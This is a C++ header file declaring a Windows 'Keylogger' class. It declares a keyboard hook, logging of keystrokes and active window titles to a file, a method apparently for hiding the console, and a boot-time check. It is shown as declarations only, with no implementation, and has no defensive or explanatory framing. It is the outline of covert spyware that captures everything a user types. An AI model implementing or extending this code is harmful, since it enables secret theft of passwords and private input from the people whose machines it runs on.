#pragma once
#include <windows.h>
#include <string>
#include <fstream>

class Keylogger {
private:
    HHOOK hookHandle;
    std::ofstream logFile;
    char lastWindow[256]{};
public:
    Keylogger(const std::string& filename);
    ~Keylogger();
    void InstallHook();
    void RemoveHook();
    void Run();
    void LogKeystroke(int vkCode);
    static LRESULT CALLBACK HookCallback(int nCode, WPARAM wParam, LPARAM lParam);
    static void SetConsoleVisibility();
    static bool IsSystemBooting();
    static Keylogger& GetInstance();
}; 